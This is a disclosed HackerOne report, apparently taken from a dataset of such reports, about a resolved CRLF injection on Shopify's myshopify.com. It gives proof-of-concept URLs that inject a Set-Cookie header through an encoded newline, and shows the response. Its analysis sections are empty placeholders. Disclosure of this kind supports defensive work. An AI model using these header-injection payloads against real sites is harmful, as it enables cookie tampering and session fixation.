---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '66386'
original_report_id: '66386'
title: '[www.*.myshopify.com] CRLF Injection'
team_handle: shopify
created_at: '2015-06-07T08:01:57.318Z'
disclosed_at: '2015-06-10T17:31:32.341Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
---

# [www.*.myshopify.com] CRLF Injection

## Metadata

- HackerOne Report ID: 66386
- Weakness: 
- Program: shopify
- Disclosed At: 2015-06-10T17:31:32.341Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

CRLF Injection via Request-URI

PoC:
http://www.myshopify.com/xxcrlftest%0aSet-Cookie:test=test3;domain=.myshopify.com;
https://www.blackfan.myshopify.com/xxx%0aSet-Cookie:test=test2;domain=.myshopify.com;

HTTP Response:
```
HTTP/1.1 302 Moved Temporarily
...
Location: http://myshopify.com/xxcrlftest
Set-Cookie:test=test;domain=.myshopify.com;
```

Result:
Creating a cookie-param "test=test" on *.myshopify.com

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
